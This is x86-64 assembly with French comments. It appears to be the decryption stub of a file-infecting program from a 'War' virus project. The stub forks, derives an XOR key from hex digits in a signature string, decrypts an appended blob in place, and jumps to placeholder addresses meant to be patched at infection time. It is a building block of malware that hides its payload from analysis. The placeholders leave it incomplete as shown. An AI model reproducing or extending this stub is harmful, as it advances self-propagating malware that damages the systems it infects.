BITS 64
start:
    endbr64
    push rax
    mov rax, 57
    syscall
    test rax, rax
    pop rax
    jnz parent

    push rax
    push r11
    push rdi
    push r12

    ; construire la clé depuis sign[offset..offset+8]
    xor r11d, r11d
    xor rdi, rdi
	lea rsi, [rel sign]
fingerloop:
    cmp rdi, 8
    je endfingerloop
    imul r11d, r11d, 16
    mov al, [rsi + rdi + 48]  ; ajuste 57 selon ton vrai offset
    call hextoval
    add r11d, eax
    inc rdi
    jmp fingerloop
endfingerloop:

    xor rdi, rdi
    mov r13, 0xdeadbeef
	lea rsi, [rel blob]
loop:
    cmp rdi, r13
    je endloop
    ; calculer le bon byte de fingerdata : (fingerdata >> (i % 4 * 8)) & 0xff
    mov eax, edi            ; eax = i
    and eax, 3              ; eax = i % 4
    imul eax, eax, 8        ; eax = (i % 4) * 8
    mov r12d, r11d          ; r12d = fingerdata
    mov ecx, eax            ; cl = shift amount
    shr r12d, cl            ; fingerdata >> (i%4 * 8)
    and r12d, 0xff          ; & 0xff → le bon byte

    ; xor avec le byte du blob
    xor byte [rsi + rdi], r12b

    inc rdi
    jmp loop
endloop:

    pop r12
    pop rdi
    pop r11
    pop rax
    jmp 0x0000000

hextoval:
    cmp al, '9'
    jg letter
    sub al, '0'
    ret
letter:
    cmp al, 'a'
    jge lowercase
    sub al, 55              ; 'A'(65) - 10 = 55
    ret
lowercase:
    sub al, 87              ; 'a'(97) - 10 = 87
    ret

parent:
    jmp 0x000000

sign: db 10, "War version 1.0 (c)oded by xxxxxxx - yyyyyy - [42694269]", 10, 0
blob:
